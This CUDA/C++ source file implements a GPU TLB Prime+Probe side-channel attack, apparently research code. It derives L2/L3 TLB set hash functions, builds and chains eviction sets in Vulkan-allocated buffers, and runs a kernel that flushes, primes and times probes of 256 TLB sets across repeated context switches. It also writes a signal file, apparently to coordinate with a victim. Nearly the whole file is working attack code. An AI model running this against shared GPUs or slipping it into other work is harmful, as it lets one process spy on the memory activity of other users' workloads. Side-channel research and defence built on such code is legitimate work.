#include <iostream>
#include <assert.h>
#include <algorithm> 
#include <array>
#include <vector>
#include <bitset>
#include <set>
#include <map>
#include <fstream>
#include <thread>
#include <chrono>

#include "instruction_chain.h"

#define STRIDE            (1L * 1024L * 1024L)                            // 1mB stride (64kB * 16)
#define TEMP_BUF_SIZE     (64 * 1024)                                     
#define TIME_BUF_SIZE     (4 * 256 * 4096)
#define WARP_SIZE         32                                              // 32 threads per warp
#define L2_SET_NUM        128                                             // 128 sets for L2 tlb cache
#define L1_ENTRY_NUM      16                                              // 16 entries for L1 tlb cache
#define L2_ENTRY_NUM      8                                               // 8 entries for each L2 tlb cache set
#define L3_ENTRY_NUM      8                                               // 8 entries for each L3 tlb cache set
#define CACHELINE_SIZE    128                                             // 128 Bytes per cache line

#define TD_NUM_PER_BLK    128                                             // allocate 128 threads per SM (4 warps)
#define L2_PTR_NUM        ((L2_SET_NUM * L2_ENTRY_NUM) / TD_NUM_PER_BLK)  // All SMs do the L2 flush seperately

#define MONITOR_BLK_NUM   64                                              // 64 SMs * 4 warps = 256 = number of L3 sets
#define MONITOR_PER_BLK   (TD_NUM_PER_BLK / WARP_SIZE)                    // 4 warps per SM
#define MONITOR_SET_CNT   (MONITOR_BLK_NUM * MONITOR_PER_BLK)             // 4 * 64 = 256 sets
#define MONITOR_TD_NUM    (TD_NUM_PER_BLK * MONITOR_BLK_NUM)              // total number of threads

#define CONTEXT_SW_TIME   20000                                           // 128 Bytes per cache line
#define LOOP_NUM          4000


#define DATA_ACCESS       48                                              // each thread access 48 L2 cache lines, 48 * 32 * 128 * 256 = 48mB

__device__ volatile unsigned long long l1_flush_cntr = 0;
__device__ volatile unsigned long long l2_flush_cntr = 0;
__device__ volatile unsigned long long l3_prime_cntr = 0;
__device__ volatile unsigned long long l3_probe_cntr = 0;
__device__ volatile unsigned long long context_switch_cntr = 0;

__global__ void
prime_probe(uint64_t *arg_l1, uint64_t *arg_l2, uint64_t *arg_prime, uint64_t *arg_probe, uint32_t *time_buf)
{
  uint64_t i = 0;
  uint64_t *temp = NULL;
  uint64_t *ptr1 = NULL;
  uint64_t *ptr2[L2_PTR_NUM];
  uint64_t *ptr3 = NULL;
  uint64_t *ptr4 = NULL;
  uint64_t *pcache[DATA_ACCESS]; // for accessing L2 data cache to evict it!
  
  uint64_t clk0;
  uint64_t clk1;
  uint64_t start;
  uint64_t prev;
  uint64_t delta;
  
  uint32_t gid1 = 0;
  uint32_t gid2 = 0;
  uint32_t gid3 = 0;
  uint32_t gid4 = 0;
  uint32_t order = 0;
  uint32_t wpid = 0;
  uint32_t inwp = 0;
  
  uint32_t ax = 0;
  uint32_t bx = 0;
  
  uint64_t iter = 0;
  uint64_t sum;
  
  ax = blockIdx.x;
  bx = (ax + 1) % MONITOR_BLK_NUM;
  
  gid1 = threadIdx.x % L1_ENTRY_NUM;
  gid2 = threadIdx.x * L2_PTR_NUM;
  wpid = threadIdx.x / WARP_SIZE;
  inwp = threadIdx.x % WARP_SIZE;
  gid3 = ax * MONITOR_PER_BLK + wpid;
  gid4 = bx * MONITOR_PER_BLK + wpid;
  order = gid4 % 4;
  
  ptr1 = (uint64_t *)arg_l1[gid1];
  for (i = 0; i < L2_PTR_NUM; ++i)
    ptr2[i] = (uint64_t *)arg_l2[gid2 + i];
  //prime the current sets and probe the next sets
  ptr3 = (uint64_t *)arg_prime[gid3];
  ptr4 = (uint64_t *)arg_probe[gid4];
  
  for (i = 0; i < DATA_ACCESS; ++i)
    pcache[i] = (uint64_t *)(arg_probe[gid3] + (i + 1) * CACHELINE_SIZE 
                                             + inwp * CACHELINE_SIZE * DATA_ACCESS);
  
  #pragma unroll 1
  for (iter = 1; iter <= LOOP_NUM; ++iter) {

    // flush L1 itlb 
    sum = 0;
    sum += dummy_func_0x0(0);
    sum += dummy_func_0x1(0);
    sum += dummy_func_0x2(0);
    sum += dummy_func_0x3(0);
    sum += dummy_func_0x4(0);
    sum += dummy_func_0x5(0);
    sum += dummy_func_0x6(0);
    sum += dummy_func_0x7(0);
    sum += dummy_func_0x8(0);
    sum += dummy_func_0x9(0);
    sum += dummy_func_0xa(0);
    sum += dummy_func_0xb(0);
    sum += dummy_func_0xc(0);
    sum += dummy_func_0xd(0);
    sum += dummy_func_0xe(0);
    sum += dummy_func_0xf(0);

    // flush L1 dtlb
    ++ptr1[0];
    atomicAdd((unsigned long long *)&l1_flush_cntr, 1);
    while (l1_flush_cntr % MONITOR_TD_NUM)
      ;
    
    // flush L2 tlb
    for (i = 0; i < L2_PTR_NUM; ++i)
      ++ptr2[i][0];
    atomicAdd((unsigned long long *)&l2_flush_cntr, 1);
    while (l2_flush_cntr % MONITOR_TD_NUM)
      ;
    
    // prime L3 tlb
    for (temp = (uint64_t *)ptr3[0]; temp != ptr3; temp = (uint64_t *)temp[0])
      ++temp[2];
    atomicAdd((unsigned long long *)&l3_prime_cntr, 1);
    while (l3_prime_cntr % MONITOR_TD_NUM)
      ;
    
    // flush 48mB L2 cache
    for (i = 0; i < DATA_ACCESS; ++i)
      ++pcache[i];
    
    // wait for context switch
    if (threadIdx.x == 0 && blockIdx.x == 0) {
      prev = 0;
      start = clock64();
      do {
        delta = clock64() - start;
        if (delta - prev > CONTEXT_SW_TIME)
          break;
        prev = delta;
      } while (1);
      time_buf[iter * (MONITOR_SET_CNT + 1)] = (uint32_t)(delta);
      atomicAdd((unsigned long long *)&context_switch_cntr, 1);
    }
    while (context_switch_cntr != iter)
      ;
    
    // each SM conducts the 4 sets' probe in order
    if (order == 0) {
      clk0 = clock64();
      for (temp = (uint64_t *)ptr4[0]; temp != ptr4; temp = (uint64_t *)temp[0])
        ++temp[2];
      clk1 = clock64();
    }
    __syncthreads();
    if (order == 1) {
      clk0 = clock64();
      for (temp = (uint64_t *)ptr4[0]; temp != ptr4; temp = (uint64_t *)temp[0])
        ++temp[2];
      clk1 = clock64();
    }
    __syncthreads();
    if (order == 2) {
      clk0 = clock64();
      for (temp = (uint64_t *)ptr4[0]; temp != ptr4; temp = (uint64_t *)temp[0])
        ++temp[2];
      clk1 = clock64();
    }
    __syncthreads();
    if (order == 3) {
      clk0 = clock64();
      for (temp = (uint64_t *)ptr4[0]; temp != ptr4; temp = (uint64_t *)temp[0])
        ++temp[2];
      clk1 = clock64();
    }
    __syncthreads();
    
    
    atomicAdd((unsigned long long *)&l3_probe_cntr, 1);
    while (l3_probe_cntr % MONITOR_TD_NUM)
      ;
    // record the probe's time
    time_buf[gid4 + iter * (MONITOR_SET_CNT + 1) + 1] = (uint32_t)(clk1 - clk0);
  }
}

/*******************************************************************************
 * Compute the L2/L3 cache set index using a hash function. Then find an 
 * eviction set for L2/L3 cache based on a target hash value
 ******************************************************************************/
uint32_t
get_hash_l2(uint64_t addr)
{
  std::bitset<64> bs(addr);
  uint32_t x0 = (bs[20] ^ bs[27] ^ bs[34] ^ bs[41]);
  uint32_t x1 = (bs[21] ^ bs[28] ^ bs[35] ^ bs[42]) << 1;
  uint32_t x2 = (bs[22] ^ bs[29] ^ bs[36] ^ bs[43]) << 2;
  uint32_t x3 = (bs[23] ^ bs[30] ^ bs[37] ^ bs[44]) << 3;
  uint32_t x4 = (bs[24] ^ bs[31] ^ bs[38] ^ bs[45]) << 4;
  uint32_t x5 = (bs[25] ^ bs[32] ^ bs[39] ^ bs[46]) << 5;
  uint32_t x6 = (bs[26] ^ bs[33] ^ bs[40]) << 6;

  uint32_t res = x6 | x5 | x4 | x3 | x2 | x1 | x0;
  return res;
}

uint32_t
get_hash_l3(uint64_t addr)
{
  std::bitset<64> bs(addr);
  uint32_t x0 = (bs[20] ^ bs[28] ^ bs[36] ^ bs[44]);
  uint32_t x1 = (bs[21] ^ bs[29] ^ bs[37] ^ bs[45]) << 1;
  uint32_t x2 = (bs[22] ^ bs[30] ^ bs[38] ^ bs[46]) << 2;
  uint32_t x3 = (bs[23] ^ bs[31] ^ bs[39]) << 3;
  uint32_t x4 = (bs[24] ^ bs[32] ^ bs[40]) << 4;
  uint32_t x5 = (bs[25] ^ bs[33] ^ bs[41]) << 5;
  uint32_t x6 = (bs[26] ^ bs[34] ^ bs[42]) << 6;
  uint32_t x7 = (bs[27] ^ bs[35] ^ bs[43]) << 7;

  uint32_t res = x7 | x6 | x5 | x4 | x3 | x2 | x1 | x0;
  return res;
}

void
find_ev_set_l2(std::vector<uint64_t> &ev_set,
    uint64_t start_addr, uint64_t end_addr, uint32_t target_hash, size_t num)
{
  for (uint64_t addr = start_addr; addr < end_addr; addr += STRIDE) {
    uint32_t temp_hash = get_hash_l2(addr);
    if (temp_hash == target_hash)
      ev_set.push_back(addr);
    if (ev_set.size() == num)
      break;
  }
}

void
find_ev_set_l3(std::vector<uint64_t> &ev_set,
    uint64_t start_addr, uint64_t end_addr, uint32_t target_hash, size_t num)
{
  for (uint64_t addr = start_addr; addr < end_addr; addr += STRIDE) {
    uint32_t temp_hash = get_hash_l3(addr);
    if (temp_hash == target_hash)
      ev_set.push_back(addr);
    if (ev_set.size() == num)
      break;
  }
}

/*******************************************************************************
 * Chains eviction set in a linked list structure in both direction 
 * within a memory buffer.
 ******************************************************************************/
void
chain_addrs(std::vector<uint64_t> &addr_vec, uint64_t *h_buf, uint64_t head_addr)
{
  for (uint64_t i = 0; i < addr_vec.size(); ++i) {
    uint64_t j = (i + 1) % addr_vec.size();
    uint64_t curr_addr = addr_vec[i];
    uint64_t next_addr = addr_vec[j];
    uint64_t idx = (curr_addr - head_addr) / 8;
    h_buf[idx] = next_addr;
  }
  
  // in the reverse order
  for (uint64_t i = 0; i < addr_vec.size(); ++i) {
    uint64_t j = (i + 1) % addr_vec.size();
    uint64_t curr_addr = addr_vec[j] + sizeof(uint64_t);
    uint64_t next_addr = addr_vec[i] + sizeof(uint64_t);
    uint64_t idx = (curr_addr - head_addr) / 8;
    h_buf[idx] = next_addr;
  }
}

/*******************************************************************************
 @brief Main function for the Prime-Probe cache attack.
 *
 * This function performs a Prime-Probe attack using Vulkan-allocated buffers. It:
 * 1. Defines memory regions for L1, L2, and L3 cache eviction sets.
 * 2. Allocates and initializes necessary memory for execution.
 * 3. Constructs the eviction sets for L2 and L3 caches.
 * 4. Chains the memory addresses to form access patterns.
 * 5. Copies data to the GPU and launches the Prime-Probe CUDA kernel.
 * 6. Measures access times and prints results.
 *
 * @param d_buf_l3 Pointer to the L3 buffer allocated by Vulkan.
 * @param d_buf_l3_size Size of the L3 buffer.
 * @param d_buf_l2 Pointer to the L1/L2 flush buffer allocated by Vulkan.
 * @param d_buf_l2_size Size of the flush buffer.
 ******************************************************************************/
void 
CudaPrimeProbe(uint64_t *d_buf_l3, size_t d_buf_l3_size, uint64_t *d_buf_l2, size_t d_buf_l2_size)
{
  uint64_t head_addr_l1 = (uint64_t)d_buf_l2;
  uint64_t tail_addr_l1 = head_addr_l1 + L1_ENTRY_NUM * STRIDE;
  uint64_t head_addr_l2 = tail_addr_l1;
  uint64_t tail_addr_l2 = head_addr_l2 + d_buf_l2_size;
  uint64_t head_addr_l3 = (uint64_t)d_buf_l3;
  uint64_t tail_addr_l3 = head_addr_l3 + d_buf_l3_size;
  
  uint64_t *d_arg_l1 = NULL;
  uint64_t *d_arg_l2 = NULL;
  uint64_t *d_arg_prime = NULL;
  uint64_t *d_arg_probe = NULL;
  uint32_t *d_time = NULL;

  //allocate host memory that temporarily save the pointer 
  uint64_t *h_arg_l1 = (uint64_t *)malloc(TEMP_BUF_SIZE);
  uint64_t *h_arg_l2 = (uint64_t *)malloc(TEMP_BUF_SIZE);
  uint64_t *h_arg_prime = (uint64_t *)malloc(TEMP_BUF_SIZE);
  uint64_t *h_arg_probe = (uint64_t *)malloc(TEMP_BUF_SIZE);
  uint32_t *h_time = (uint32_t *)malloc(TIME_BUF_SIZE);
  uint64_t *h_buf_l3 = (uint64_t *)malloc(d_buf_l3_size);
  
  //allocate the memory that stores the head of the pointers
  cudaMalloc(&d_arg_l1, TEMP_BUF_SIZE);
  cudaMalloc(&d_arg_l2, TEMP_BUF_SIZE);
  cudaMalloc(&d_arg_prime, TEMP_BUF_SIZE);
  cudaMalloc(&d_arg_probe, TEMP_BUF_SIZE);
  cudaMalloc(&d_time, TIME_BUF_SIZE);
  for (int i = 0; i < L1_ENTRY_NUM; ++i)
    h_arg_l1[i] = head_addr_l1 + i * STRIDE;
  
  //L2 flush pointers without chained
  uint64_t thread_num = 0;
  for (uint32_t hash_l2 = 0; hash_l2 < L2_SET_NUM; ++hash_l2) {
    std::vector<uint64_t> flush_vec;
    find_ev_set_l2(flush_vec, head_addr_l2, tail_addr_l2, hash_l2, L2_ENTRY_NUM);
    assert(flush_vec.size() == L2_ENTRY_NUM);
    for (auto addr : flush_vec)
      h_arg_l2[thread_num++] = addr;
  }
  
  //Chained L3 prime probe pointers 
  std::vector<uint32_t> hash_vec;
  for (uint32_t i = 0; i < MONITOR_SET_CNT; ++i)
    hash_vec.push_back(i);
  
  for (uint64_t i = 0; i < hash_vec.size(); ++i) {
    uint32_t hash_l3 = hash_vec[i];
    std::vector<uint64_t> chase_vec;
    find_ev_set_l3(chase_vec, head_addr_l3, tail_addr_l3, hash_l3, L3_ENTRY_NUM);
    assert(chase_vec.size() == L3_ENTRY_NUM);
    chain_addrs(chase_vec, h_buf_l3, head_addr_l3);
    h_arg_prime[i] = chase_vec.front();
    h_arg_probe[i] = chase_vec.back() + sizeof(uint64_t);
  }
  

  cudaMemcpy(d_arg_l1, h_arg_l1, TEMP_BUF_SIZE, cudaMemcpyHostToDevice);
  cudaMemcpy(d_arg_l2, h_arg_l2, TEMP_BUF_SIZE, cudaMemcpyHostToDevice);
  cudaMemcpy(d_arg_prime, h_arg_prime, TEMP_BUF_SIZE, cudaMemcpyHostToDevice);
  cudaMemcpy(d_arg_probe, h_arg_probe, TEMP_BUF_SIZE, cudaMemcpyHostToDevice);
  cudaMemcpy(d_buf_l3, h_buf_l3, d_buf_l3_size, cudaMemcpyHostToDevice);
  cudaDeviceSynchronize();

  //before get into the kernel, give out a signal file
  std::ofstream signal_file("signal.txt");
  signal_file << "Task Completed";
  signal_file.close();
  
  prime_probe<<<MONITOR_BLK_NUM, TD_NUM_PER_BLK>>>(d_arg_l1, d_arg_l2, d_arg_prime, d_arg_probe, d_time);
  cudaDeviceSynchronize();
  
  //print the outputs
  cudaMemcpy(h_time, d_time, TIME_BUF_SIZE, cudaMemcpyDeviceToHost);
  for (uint64_t i = 1; i <= LOOP_NUM; ++i) {
    std::cout << "delta: " << std::dec << h_time[i * (MONITOR_SET_CNT + 1)] << std::endl;
    for (uint64_t j = 1; j < MONITOR_SET_CNT + 1; ++j) {
      std::cout << std::dec << h_time[j + i * (MONITOR_SET_CNT + 1)] << " ";
    }
    std::cout << std::endl;
    std::cout << std::endl;
  }
  
}


